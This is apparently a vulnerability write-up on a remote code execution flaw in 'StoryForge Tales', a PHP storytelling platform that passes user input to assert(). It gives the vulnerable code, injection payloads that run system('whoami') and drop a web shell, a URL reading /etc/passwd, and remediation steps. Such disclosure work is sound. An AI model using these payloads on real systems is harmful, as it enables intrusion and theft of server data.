StoryForge Tales — Remote Code Execution via PHP assert() String Evaluation

 28 Jul 2026 · 5 min read

This write-up details a Critical Remote Code Execution vulnerability in StoryForge Tales — a PHP-based interactive storytelling platform. The flaw resides in the ChoiceEvaluator class, where user-controlled input is passed directly to PHP's built-in assert() function.

Severity: Critical (CVSS 9.8)  ·  Class: Eval Injection / RCE (CWE-95)  ·  Platform: PHP < 8.0

The Vulnerability: assert() as eval()

In PHP versions prior to 8.0, assert() has two operational modes depending on the argument type. When passed a string, PHP treats the contents as raw PHP code and dynamically executes it using an internal eval() wrapper — provided assert.active = 1 (the default).

The ChoiceEvaluator takes user-supplied choice_expr values and passes them directly to assert() without any sanitization:

class ChoiceEvaluator {
  public function evaluateChoice($storyId, $choiceExpr) {
    if (empty($choiceExpr)) {
      return 'default';
    }

    // VULNERABILITY: $choiceExpr evaluated as PHP code
    assert($choiceExpr);

    $story = $this->loadStoryContext($storyId);
    return $this->processExpression($choiceExpr, $story);
  }
}

Exploit Payloads

Command Execution

// Attacker Input (choice_expr):
' . system('whoami') . '

// PHP executes system('whoami') and concatenates the output
// with empty strings — running the OS command directly.

Persistent Web Shell

// Attacker Input (choice_expr):
' . file_put_contents('shell.php', '') . '

// Creates a backdoor in the web root:
// https://target/shell.php?cmd=cat+/etc/passwd

Technical & Business Impact

  • Full Remote Code Execution — attacker gains execution under the web server user context (www-data).
  • Database Exfiltration — ability to read database credentials, query story and user tables, or wipe application state.
  • Privilege Escalation & Lateral Movement — access to the underlying host enables local privilege escalation vectors and internal network pivoting.

Remediation

User input must never be passed to code execution primitives like assert() or eval().

  1. Remove the assert() call entirely — replace with safe, deterministic expression parsing or simple conditional comparison.
  2. Upgrade to PHP 8.0+ — string evaluation in assert() is completely removed; string arguments now throw a TypeError.
  3. Harden PHP configuration — set zend.assertions = -1 or assert.active = 0 in production php.ini.
// Remediated: strict type validation, no code evaluation
public function evaluateChoice($storyId, $choiceExpr) {
  if (empty($choiceExpr)) {
    return 'default';
  }

  if (!is_string($choiceExpr) || strlen($choiceExpr) > 255) {
    throw new InvalidArgumentException("Invalid choice expression format.");
  }

  $story = $this->loadStoryContext($storyId);
  return $this->processExpression($choiceExpr, $story);
}

Key Takeaways for Auditors

  • Treat assert($str) like eval($str) — in PHP < 8.0, string assertions are dangerous code execution primitives.
  • Harden PHP config — disable assertion evaluation in production environments.
  • Upgrade the runtime — PHP 8.0+ converts string assertion calls into TypeError instead of executing code.
